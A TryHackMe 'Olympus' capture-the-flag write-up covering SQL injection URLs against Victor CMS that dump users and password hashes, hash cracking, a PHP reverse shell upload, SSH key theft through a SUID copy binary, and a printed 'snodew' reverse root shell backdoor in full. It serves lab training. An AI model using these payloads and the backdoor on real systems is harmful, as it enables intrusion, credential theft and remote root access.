# Olympus

## Introduction:

Welcome to my another writeup! In this TryHackMe [Olympus](https://tryhackme.com/room/olympusroom) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background:

> Hey!

> Start the VM here and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **Bruteforcing against any login page is out of scope and should not be used.**

> Well... Happy hacking ^^ 

> Gavroche

## Difficulty:

> **Medium**

# Enumeration:

As usual, scan the machine via `rustscan`!

**Rustscan Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# export IP=10.10.xxx.xxx

┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $IP -- -sC -sV -oN rustscan/rustscan.txt
[...]
Open 10.10.23.107:22
Open 10.10.23.107:80
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNeXYxrC1xv8fhFNve9CXjWSQcCXnWZThU1putOar7KBcQmoCQUYOqvmS+CDauJMPqVE3rqS0+CpTJnZn2ZWXDaCzFLZ84hjBXq8BqoWOFB0Vv0PjRKfBKC54tpA67NgLfp1TmmlS6jp4i75lxkZ6pSTOPxGUrvYvJ0iN2cAHJkgA9SZDrvT11HEp5oLmS2lXtFSoK/Q9pKNIl7y+07gZLRUeIKIn1bFRc4qrXn+rpDQR2fP9OEYiHhdJmTJJL+KjDAqZmIj0SYtuzD4Ok2Nkg5DHlCzOizYNQAkkj6Ift7dkD6LPebRp9MkAoThDzLya7YaFIP66mCbxJRPcNfQ3bJkUy0qTsu9MiiNtyvd9m8vacyA803eKIERIRj5JK1BTUKNAzsZeAuao9Kq/etHskvTy0TKspeBLwdmmRFkqerDIrznWcRyG/UnsEGUARe2h6CwuCJH8QCPMSc93zMrsZNs1z3FIoMzWTf23MWDOeNA8dkYewrDywEuOvb3Vrvk=
|   256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHFtzLQXLhGiDzPN7Al84lSfH3jFwGniFL5WQSaIjC+VGMU8mbvbGVuOij+xUAbYarbBuoUagljDmBR5WIRSDeo=
|   256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhvoRyjZN/taS1uwwTaQ4uZrGhVUje0YWW4jg4rfdXw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[...]
```

According to `rustscan` result, we have several ports are open:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | Apache httpd 2.4.41

Also, in the `http-title:` of the `rustscan` result, we can see it's redirecting to `http://olympus.thm`. So let's add this domain to `/etc/hosts`!

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# nano /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.xxx.xxx olympus.thm
```

## HTTP Port:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a1.png)

In the `index` page of `http://olympus.thm`, we can see "The old version of the website is still **accessible** on this domain.". Maybe we could find a directory that contains the old version of the website?? Let's try to find that via `feroxbuster` to enumerate any hidden directory!

**Feroxbuster Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# feroxbuster -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -e -t 100 -o ferox
[...]
403      GET        9l       28w      276c http://olympus.thm/.htaccess
403      GET        9l       28w      276c http://olympus.thm/.hta
200      GET      459l      923w     8825c http://olympus.thm/static/style.css
301      GET        9l       28w      315c http://olympus.thm/~webmaster => http://olympus.thm/~webmaster/
200      GET       58l      155w     2209c http://olympus.thm/static/images/watermelon.svg
403      GET        9l       28w      276c http://olympus.thm/~webmaster/.hta
403      GET        9l       28w      276c http://olympus.thm/~webmaster/.htaccess
403      GET        9l       28w      276c http://olympus.thm/~webmaster/.htpasswd
403      GET        9l       28w      276c http://olympus.thm/.htpasswd
301      GET        9l       28w      321c http://olympus.thm/~webmaster/admin => http://olympus.thm/~webmaster/admin/
403      GET        9l       28w      276c http://olympus.thm/~webmaster/admin/.hta
403      GET        9l       28w      276c http://olympus.thm/~webmaster/admin/.htaccess
403      GET        9l       28w      276c http://olympus.thm/~webmaster/admin/.htpasswd
```

As we can see, we see `/~webmaster/` and `/static/`. The `/~webmaster/` directory seems interesting.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a2.png)

Looks like the old version of the website is using `Victor CMS`. Let's use `searchsploit` to find public exploits.

**Searchsploit Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# searchsploit victor cms         
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                       | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                           | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                 | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                             | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                           | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                 | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                              | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                               | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                           | php/webapps/49282.txt
---------------------------------------------------------------------------------- ---------------------------------
```

It seems like Victor CMS 1.0 is vulnerable to **SQL Injection**! We can take a look at one of the txt file, such as `48485.txt`.

**Victor CMS 1.0 - 'cat_id' SQL Injection:**
```
Description: The GET parameter 'category.php?cat_id=' is vulnerable to SQL Injection

Payload: UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server.
```

Let's copy and paste the payload to test is it really vulnerable to SQL Injection!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a3.png)

As we can see, it's vulnerable to SQL Injection, and successfully retrieve the database name and version of MySQL running on the server!

- MySQL version: 8.0.28-0ubuntu0.20.04.3
- Database name: olympus

Next, we can now retrieve all databases name:

**Retrieve all database name:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(schema_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.schemata--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a4.png)

All databases name:
- mysql
- information_schema
- performance_schema
- sys
- phpmyadmin
- olympus

Hmm... `olympus` database seems interesting, let's retrieve it's table names:

**Retrieve table names:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(TABLE_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.TABLES%20WHERE%20table_schema=%27olympus%27--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a5.png)

Database `olympus`'s all table names:
- categories
- chats
- comments
- flag
- posts
- users

Oh! there is a `flag` table, let's retrieve the flag! To do so, I'll first retrieve `flag`'s column name:

**Retrieve `flag` column name:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27flag%27--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a6.png)

Database `olympus`'s table `flag` column name:
- flag

Then, we can now retrieve it's data!

**Retrieve `flag` data:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(flag),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20flag--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a7.png)

`flag{Redacted}`

Now we've retrieve the flag. The next thing we need to do is other data in the `olympus` database! Let's retrieve all data from `users` table first!

**Retrieve `users` column names:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27users%27--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a8.png)

Database `olympus`'s table `users` column names:
- randsalt
- user_email
- user_firstname
- user_id
- user_image
- user_lastname
- user_name
- user_password
- user_role
- CURRENT_CONNECTIONS
- TOTAL_CONNECTIONS

Let's retrieve `user_name` and `user_password` data!

**Retrieve `user_name`, `user_password` data:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(user_name,0x3a,user_password),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20users--
```

> Note: The `0x3a` means `:`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a9.png)

Yes!! We successfully found the user names and their password *hashes*!

**Found user names and password hashes:**
```
prometheus:$2y$10$[Redacted]
root:$2y$10$[Redacted]
zeus:$2y$10$[Redacted]
```

We could crack those password hashes via `John The Ripper`! However, the only password hash cracked is the user `prometheus`.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt prometheus.hash
[...]
[Redacted] (prometheus)
```

Next, we can also retrieve all data from column `user_email`!

**Retrieve `user_email` data:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(user_email),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20users--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a10.png)

Database `olympus`'s table `user_email` data:
- prometheus@olympus.thm
- root@chat.olympus.thm
- zeus@chat.olympus.thm

It looks like we've found another subdomain?? Let's add `chat.olympus.thm` to `/etc/hosts`.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# nano /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.xxx.xxx olympus.thm chat.olympus.thm
```

Now, I think we've retrieved enough data from table `users`, let's move on to another table: `chats`.

**Retrieve `chats` all column names:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27chats%27--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a11.png)

Database `olympus`'s table `chats` all column names:
- dt
- file
- msg
- uname

Again, we can retrieve all data from table `chats`!

**Retrieve all data from table `chats`:**
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(dt,0x3a,file,0x3a,msg,0x3a,uname),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20chats--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a12.png)

> Note: To view it's content clearly, you can do it via `View Page Source` in FireFox.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a13.png)

```
2022-04-05:47c3210d51761686f3af40a875eeaaea.txt:Attached : prometheus_password.txt:prometheus

2022-04-05::This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...:prometheus

2022-04-06::I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it.:zeus
```

Hmm... The `47c3210d51761686f3af40a875eeaaea.txt` looks like is generated from random file name function, and `prometheus` said there is an upload page and upload folder.

> For the sake of this walkthrough, I'll skip enumerating others database, tables and columns. In a real world engagement, you should enumerate the entire database.

Now, I think we should have enough information to gain an initial shell, let's move on to the next section: **Initial Shell**.

Since we found `prometheus` user's credential, we can login to the admin page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a15.png)

Also, since we're authenticated to the admin page, we could upload a PHP reverse shell or webshell.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# searchsploit victor cms         
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
[...]
Victor CMS 1.0 - File Upload To RCE                                               | php/webapps/49310.txt
[...]
---------------------------------------------------------------------------------- ---------------------------------
```

**49310.txt**
```
Step1: register http://localhost/CMSsite-master/register.php
step2: login as user
step3: Go to Profile
step4: upload image as php file (upload shell.php)
step5: update user
step6: You will find your shell in img folder :/path/img/cmd.php

http://localhost/CMSsite-master/img/cmd.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we're already login, we can just ignore step 1 and 2. Let's follow it's step and gain an initial shell!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a16.png)

I'll use a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):

Modify the PHP reverse shell:

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Then upload it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a17.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a18.png)

Go to http://olympus.thm/~webmaster/img/revshell.php:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a19.png)

Umm... 403 Forbidden?? Looks like the developers of this website has blocked people from accessing `/img/` directory...

# Real Initial Shell:

Now, take a step back, and think what information we've gathered. **Another subdomain**, right?

Since we've found `chat.olympus.thm` subdomain in the database `olympus`'s table `user_email`, we can enumerate this subdomain.

Let's go to http://chat.olympus.thm/ then.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a20.png)

It redirects me to a login page. Let's try use the user `prometheus` credential.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a21.png)

Hmm... This looks familiar as we saw this during the SQL Injection section.

Next, I'll enumerate any hidden directory again with `feroxbuster`:

**Feroxbuster Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# feroxbuster -u http://chat.olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -e -t 100 -o ferox1
[...]
302      GET        0l        0w        0c http://chat.olympus.thm/ => login.php
403      GET        9l       28w      281c http://chat.olympus.thm/.hta
403      GET        9l       28w      281c http://chat.olympus.thm/.htpasswd
403      GET        9l       28w      281c http://chat.olympus.thm/.htaccess
302      GET        0l        0w        0c http://chat.olympus.thm/index.php => login.php
301      GET        9l       28w      325c http://chat.olympus.thm/javascript => http://chat.olympus.thm/javascript/
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/.hta
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/.htaccess
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/.htpasswd
403      GET        9l       28w      281c http://chat.olympus.thm/phpmyadmin
403      GET        9l       28w      281c http://chat.olympus.thm/server-status
301      GET        9l       28w      321c http://chat.olympus.thm/static => http://chat.olympus.thm/static/
200      GET      111l      192w     2191c http://chat.olympus.thm/static/particles.json
200      GET        9l      202w    23364c http://chat.olympus.thm/static/particles.min.js
301      GET        9l       28w      322c http://chat.olympus.thm/uploads => http://chat.olympus.thm/uploads/
200      GET      459l      923w     8825c http://chat.olympus.thm/static/style.css
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/jquery/.hta
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/jquery/.htpasswd
403      GET        9l       28w      281c http://chat.olympus.thm/javascript/jquery/.htaccess
200      GET      349l      914w     6138c http://chat.olympus.thm/static/normalize.css
403      GET        9l       28w      281c http://chat.olympus.thm/uploads/.htaccess
403      GET        9l       28w      281c http://chat.olympus.thm/uploads/.hta
403      GET        9l       28w      281c http://chat.olympus.thm/uploads/.htpasswd
200      GET       58l      155w     2209c http://chat.olympus.thm/static/images/watermelon.svg
200      GET    15836l    95035w  4186083c http://chat.olympus.thm/static/images/background.png
200      GET        5l       32w      471c http://chat.olympus.thm/static/images/load.svg
[...]
```

This time, we found `/javascript/`, `/phpmyadmin/`, `/static/` and `/uploads/` directories.

Let's take a look at `/uploads/` directory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a23.png)

An empty page?

Again, take a step back. Think what information we've gathered.

1. We've retrieved database `olympus`'s table `chats` all data.
2. We found an unknown *txt* file in the `file` column from the `chats` table.
3. It's using a random file name function to make it harder for attackers to access the uploaded files.

```
2022-04-05:47c3210d51761686f3af40a875eeaaea.txt:Attached : prometheus_password.txt:prometheus
```

Maybe that *txt* file is the uploaded file?? Let's verify that.

Go to http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a24.png)

Yes!! Our theory is correct! Now, we can combine SQL Injection and Arbitrary File Upload vulnerabilities to gain an initial shell!!

First, let's upload a PHP reverse shell again. (From [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a22.png)

Then, find the uploaded file name from table `chats`, column `file` via SQL Injection:
```sql
http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(file,0x3a,msg),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20chats--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a25.png)

Wow!! We found the uploaded file name!!

Finally, setup a `nc` listener on port 443, and trigger it:

`http://chat.olympus.thm/uploads/1bdfe241130e582d92c96be14cb4f356.php`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a27.png)

We're now `www-data`!!

**user.flag**
```
www-data@olympus:/$ cat /home/zeus/user.flag
flag{Redacted}
```

# Privilege Escalation:

## www-data to zeus:

By enumerating manually, we can found that the `/usr/bin/cputils` binary has a SUID sticky bit.

```
www-data@olympus:/$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/cputils
[...]
```

**cputils binary**
```
www-data@olympus:/$ ls -lah /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils

www-data@olympus:/$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /etc/passwd

Enter the Name of Target File: /tmp/passwd

File copied successfully.

www-data@olympus:/$ ls -lah /tmp
[...]
-rw-rw-rw-  1 zeus www-data 1.9K Jul 20 08:23 passwd
```

Hmm... Looks like it's copying file? Also, the binary is owned by `zeus`.

We also found that user `zeus` has `.ssh` directory, but `www-data` couldn't access.

```
www-data@olympus:/home/zeus$ ls -lah
[...]
lrwxrwxrwx 1 root root    9 Mar 23 08:58 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus 3.7K Feb 25  2020 .bashrc
drwx------ 2 zeus zeus 4.0K Mar 22 15:13 .cache
drwx------ 3 zeus zeus 4.0K Apr 14 09:56 .gnupg
drwxrwxr-x 3 zeus zeus 4.0K Mar 23 08:33 .local
-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
drwx------ 2 zeus zeus 4.0K Apr 14 10:35 .ssh
-rw-r--r-- 1 zeus zeus    0 Mar 22 15:13 .sudo_as_admin_successful
drwx------ 3 zeus zeus 4.0K Apr 14 09:56 snap
-rw-rw-r-- 1 zeus zeus   34 Mar 23 08:34 user.flag
-r--r--r-- 1 zeus zeus  199 Apr 15 07:28 zeus.txt
```

Since the `/usr/bin/cputils` has a SUID sticky bit, we can copy `zeus`'s SSH private key, then we can use his private key to SSH into `zeus`!! Let's do this!

**Copy `zeus`'s private SSH key:**
```
www-data@olympus:/$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.

www-data@olympus:/$ cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[...]
```

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# nano zeus_id_rsa

┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# ssh -i zeus_id_rsa zeus@$IP       
[...]
Enter passphrase for key 'zeus_id_rsa': 
zeus@10.10.23.107's password:
```

Unfortunately, `zeus`'s private SSH key has a passphrase. But we could crack it via `ssh2john` and `John The Ripper`!

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# ssh2john zeus_id_rsa > zeus_id_rsa.hash

┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zeus_id_rsa.hash 
[...]
[redacted]        (zeus_id_rsa)
```

Armed with his passphrase, we now can SSH into `zeus` account!

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# ssh -i zeus_id_rsa zeus@$IP
Enter passphrase for key 'zeus_id_rsa': 
[...]
zeus@olympus:~$ whoami; id; hostname; ip a
zeus
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
olympus
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:01:2a:13:90:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.23.107/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2191sec preferred_lft 2191sec
    inet6 fe80::1:2aff:fe13:9071/64 scope link 
       valid_lft forever preferred_lft forever
```

## zeus to root:

By enumerating manually, we can find that in the webroot (`/var/www/html`) directory has a weird directory called `0aB44fdS3eDnLkpsz3deGv8TttR4sc`, and it's accessible to user `root` and group `zeus`!

```
zeus@olympus:/var/www/html$ ls -lahR
.:
total 28K
drwxr-xr-x 3 www-data www-data 4.0K May  1 09:01 .
drwxr-xr-x 5 root     root     4.0K Mar 22 16:52 ..
drwxrwx--x 2 root     zeus     4.0K Jul 15 20:55 0aB44fdS3eDnLkpsz3deGv8TttR4sc
-rwxr-xr-x 1 root     root      11K Apr 18 17:18 index.html.old
-rwxr-xr-x 1 root     root       57 Apr 18 17:20 index.php

./0aB44fdS3eDnLkpsz3deGv8TttR4sc:
total 12K
drwxrwx--x 2 root     zeus     4.0K Jul 15 20:55 .
drwxr-xr-x 3 www-data www-data 4.0K May  1 09:01 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14 09:54 index.html
-rwxr-xr-x 1 root     zeus     1.6K Jul 15 20:55 VIGQFQFMYOST.php
```

Hmm... Weird. Let's see what the `VIGQFQFMYOST.php` doing.

**VIGQFQFMYOST.php:**
```php
<?php
$pass = "[Redacted]";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```

Snodew reverse root shell backdoor?? Let's use our browser to browse that PHP website.

`http://10.10.xxx.xxx/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a28.png)

It requires a password. However, in the `VIGQFQFMYOST.php`, we can see it's password!

In the `$pass` variable, it's a string of password. Let's use that to login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a29.png)

Sweet! It's a reverse shell root backdoor! Let's make a reverse shell!

`http://10.10.xxx.xxx/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=YOUR_IP&port=443`

```
┌──(root💀nam)-[~/ctf/thm/ctf/Olympus]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [Redacted] from (UNKNOWN) [10.10.23.107] 35054
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 08:44:05 up 35 min,  1 user,  load average: 0.00, 0.00, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/4    10.18.61.134     08:43   13.00s  0.04s  0.04s -bash
python3 -c "import pty;pty.spawn('/bin/bash')"
root@olympus:/# whoami; id; hostname; ip a
whoami; id; hostname; ip a
root
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)
olympus
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:01:2a:13:90:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.23.107/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3296sec preferred_lft 3296sec
    inet6 fe80::1:2aff:fe13:9071/64 scope link 
       valid_lft forever preferred_lft forever
```

We're root now!!

**root.flag**
```
root@olympus:/# cat /root/root.flag
                    ### Congrats !! ###

                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          

                You did it, you defeated the gods.
                        Hope you had fun !

                   flag{Redacted}

PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```

A hidden flag? Interesting. I'll use `grep -orE` to grab the hidden flag! 

**Hidden flag and all flags:**
```
root@olympus:/# grep -orE 'flag{.*?}'
root/root.flag:flag{Redacted}
